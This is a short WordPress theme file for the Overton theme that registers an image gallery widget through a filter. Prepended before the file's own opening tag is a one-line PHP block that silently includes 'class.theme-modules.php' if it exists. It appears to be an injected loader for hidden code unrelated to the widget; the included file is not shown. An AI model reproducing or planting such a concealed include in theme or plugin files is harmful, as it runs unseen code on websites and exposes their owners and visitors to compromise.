<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_register_image_gallery_widget' ) ) {
	/**
	 * Function that register image gallery widget
	 */
	function overton_mikado_register_image_gallery_widget( $widgets ) {
		$widgets[] = 'OvertonMikadoClassImageGalleryWidget';
		
		return $widgets;
	}
	
	add_filter( 'overton_mikado_filter_register_widgets', 'overton_mikado_register_image_gallery_widget' );
}